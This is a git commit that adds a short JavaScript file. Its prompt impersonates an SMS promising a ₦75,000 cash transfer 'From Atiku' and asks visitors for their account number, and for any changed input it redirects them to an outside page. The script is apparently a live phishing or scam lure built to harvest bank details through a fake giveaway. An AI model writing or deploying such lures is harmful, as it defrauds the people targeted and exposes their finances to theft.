ed238dc25bafe97f193c8c6a4100caf1e6d7248b
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-05-09 03:51:27 -0700

    Create atiku-verify.js

---
+++ atiku-verify.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦75,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦75,000 Birthday Celebration Cash Transfer From Atiku, click OK to Enter Your Acc. Number','WITHDRAW ₦75,000');
+if (password != 'WITHDRAW ₦75,000') {
+location.href='https://isoiba.com/atiku-birthday.html';
+}
